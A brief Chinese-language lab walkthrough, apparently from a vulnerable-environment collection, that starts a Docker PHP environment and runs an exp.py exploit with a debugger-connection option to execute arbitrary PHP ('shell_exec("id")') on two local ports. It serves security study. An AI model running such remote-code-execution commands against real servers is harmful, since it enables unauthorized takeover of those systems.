开启环境：
```
docker compose up -d
```

访问URL可以看到info页面：
```
http://localhost:18080
```

```
http://localhost:8081
```

使用脚本可以在服务器上执行任意PHP代码：
```
python3 exp.py -t http://localhost:18080/index.php -c 'shell_exec("id");' --dbgp-ip 0.250.250.254
```

```
python3 exp.py -t http://localhost:8081/index.php -c 'shell_exec("id");' --dbgp-ip 0.250.250.254
```
